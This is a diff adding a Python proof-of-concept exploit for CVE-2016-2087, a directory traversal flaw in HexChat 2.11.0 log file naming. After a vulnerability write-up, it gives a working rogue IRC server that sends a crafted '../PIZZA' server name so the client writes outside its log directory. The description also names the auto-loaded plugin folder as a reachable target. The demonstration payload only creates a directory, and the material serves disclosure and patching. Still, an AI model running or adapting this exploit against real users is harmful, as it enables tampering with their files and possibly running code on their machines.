@@ -1,0 +1,93 @@
+#!/usr/bin/python
+#
+####################
+# Meta information #
+####################
+# Exploit Title: Hexchat IRC client - Server name log directory traversal
+# Date: 2016-01-26
+# Exploit Author: PizzaHatHacker
+# Vendor Homepage: https://hexchat.github.io/index.html
+# Software Link: https://hexchat.github.io/downloads.html
+# Version: 2.11.0
+# Tested on: HexChat 2.11.0 & Linux (64 bits)
+# CVE : CVE-2016-2087
+
+#############################
+# Vulnerability description #
+#############################
+'''
+Server Name Directory Traversal in src/common/text.c :
+static char * log_create_pathname (char *servname, char *channame, char *netname)
+
+In this function, channame (channel name) and netname (network name as 
+configured in the client software) are sanitized to prevent directory 
+traversal issues when creating a logfile BUT servname (server-provided
+information) is NOT sanitized before possibly being injected into 
+the file path via the 'log_insert_vars' function call.
+
+This bug could be triggered in the special (non-default) configuration
+where a user would have :
+* Enabled logging (Settings > Preferences > Chatting > Logging)
+* Used a pattern containing '%s' in the log filepath (instead 
+of the default = '%n\%c.log').
+
+When connecting to a malicious server, Hexchat IRC client may create or modify
+arbitrary files on the filesystem with the permissions of the IRC client user
+(non-root). For example, the following directories are accessible easily :
+* <Hexchat-Conf>/addons : Executable plugin files that are automatically loaded
+when starting Hexchat IRC client
+* <Hexchat-Conf>/logs : ALL logfiles (from other servers too)
+* <Hexchat-Conf>/scrollback : Scrollback text that is automatically 
+loaded when entering a channel/server (this may trigger further bugs)
+* <Hexchat-Conf>/sounds : Sounds that may be played on demand via CTCP
+SOUND messages (this could also trigger further bugs)
+* etc.
+
+CVSS v2 Vector : (AV:N/AC:H/Au:N/C:N/I:P/A:P)
+CVSS Base Score : 4
+Impact Subscore : 4.9
+Exploitability Subscore : 4.9
+'''
+
+####################
+# Proof of Concept #
+####################
+'''
+* Install Hexchat IRC Client
+* Settings > Preferences > Chatting > Logging : Enable logging and use the log
+filepath pattern : '%s\%c.log' (without the quotes)
+* Run this Python script on a (server) machine
+* Connect to the server running the script
+* Results : A 'PIZZA' directory will appear in <Hexchat-Conf>/PIZZA instead
+of something like <Hexchat-Conf>/logs/___PIZZA
+'''
+
+import socket
+import sys
+import time
+
+# Exploit configuration
+HOST = ''
+PORT = 6667
+SERVERNAME = '../PIZZA'
+
+# Create server socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+	sock.bind((HOST, PORT)) # Bind to port
+	sock.listen(0) # Start listening on socket
+	
+	print 'Server listening, waiting for connection...'
+	conn, addr = sock.accept()
+	
+	print 'Connected with ' + addr[0] + ':' + str(addr[1]) + ', sending packets...'
+	conn.send(':' + SERVERNAME + ' 001 bob :Welcome to the Internet Relay Network\r\n')
+	
+	# Wait and close socket
+	conn.recv(256)
+	sock.close()
+	
+	print 'Done.'
+
+except socket.error as msg:
+	print 'Failure binding to port : ' + str(msg[0]) + ' ' + msg[1]
